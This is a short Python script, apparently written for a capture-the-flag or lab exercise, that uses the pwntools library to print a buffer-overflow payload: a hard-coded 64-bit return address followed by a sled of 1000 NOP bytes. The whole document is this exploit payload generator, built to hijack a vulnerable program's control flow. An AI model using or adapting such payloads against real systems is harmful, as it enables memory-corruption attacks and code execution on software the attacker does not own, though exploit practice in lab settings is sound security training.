import sys
from pwn import *

sys.stdout.buffer.write(p64(0x555555554650) + b'\x90'*1000)